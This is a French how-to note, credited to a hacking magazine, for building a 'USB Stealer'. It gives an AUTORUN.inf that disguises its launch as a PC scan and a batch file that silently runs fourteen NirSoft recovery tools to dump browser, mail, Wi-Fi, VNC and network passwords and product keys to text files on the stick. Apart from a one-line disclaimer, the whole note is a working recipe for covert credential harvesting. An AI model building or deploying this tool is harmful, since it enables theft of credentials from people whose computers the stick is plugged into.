---
Title: USB Stealer
Catégorie: Hacking
Nature: Notes
Date de création: 12/09/2020
---

# Création d'une Clé USB Stealer

## Introduction
USB Stealer est une clé USB capable d'aspirer tous les mots de passe d'un PC (navigateurs, mail, réseaux, ...). Il scanne un PC et récupère automatiquement tous les identifiants détectables.
Ceci peut être utile, par exemple, pour récupérer ses propres mots de passe ou de ceux de ses utilisateurs avant d'effectuer une réinitialisation complète de leurs PC. **Mais à ne jamais utiliser pour nuire à quelq'un!!!**.
Dans cette note, nous allons voir comment en créer une.


## Préparation de la clé
Nous allons utiliser une clé USB quelconque et la formater. Pas besoin d'une clé neuve ou taille grande, juste une veille clé d'1 giga peut bien faire l'affaire.

## Création d'un fichier AUTORUN
Maintenant que la clé est bien formatée, donc prête, nous allons créer dedans le fichier **AUTORUN.inf**. Dans ce fichier, nous allons ajouter le contenu ci-dessous :
```
[autorun]
open=launch.bat
ACTION=Passer un scan
```
puis enregistrer le fichier.

## Création du Batch
Une fois que le fichier **AUTORUN** est créé, nous allons créer le fichier **launch.bat** qui va contenir les instructions ci-dessous :
```
Start mspass.exe /stext mspass.txt
Start mailpv.exe /stext mailpv.txt
Start iepv.exe /stext iepv.txt
Start PasswordFox.exe /stext PasswordFox.txt
Start OperaPassView.exe /stext OperaPassView.txt
Start ChromePass.exe /stext ChromePass.txt
Start Dialupass.exe /stext Dialupass.txt
Start netpass.exe /stext netpass.txt
Start WirelessKeyView.exe /stext WirelessKeyView.txt
Start BulletsPassView.exe /stext BulletsPassView.txt
Start VNCPassView.exe /stext VNCPassView.txt
Start OpenFilesView.exe /stext OpenFilesView.txt
Start ProducKey.exe /stext ProducKey.txt
Start USBDeview.exe /stext USBDeview.txt          
```
## Construction de la bibliothèque de logiciels
Le Batch contient plusieurs instructions, chacun invoquant un outil bien précis. Donc, nous allons installer sur la clé l'ensemble de ces outils. Ces derniers sont disponibles sur le site de [Nirsoft](https://www.nirsoft.net/). Voici la liste :
```
- Mspass
- Mailpv
- Iepv
- PasswordFox
- OperaPassView
- ChromePass
- Dialupass
- Netpass
- WirelessKeyView
- BulletsPassView
- VNCPassView
- OpenFilesView
- ProducKey
- USBDeview
```
> On peut ajouter/retirer les outils non voulus. Cependant, dans ce cas, il faut modifier le batch en conséquence.

## Test de la clé
Maintenant que la clé est configurée, nous allons la tester. Pour cela, nous allons la débrancher puis la rebrancher sur le PC. Si tout est bien fait, une fenêtre devrait apparaître sur l'écran proposant de lancer un scan du PC. Confirmons le scan. A partir de ce moment, tous les outils vont être sollicités pour parcourir le PC à la recherche des identifiants. A la fin de l'opération, les mots de passe récupérés seront stoqués dans le fichier **.txt** de chaque outil.

# Source
- Magazine **Hack & Crack n°28**
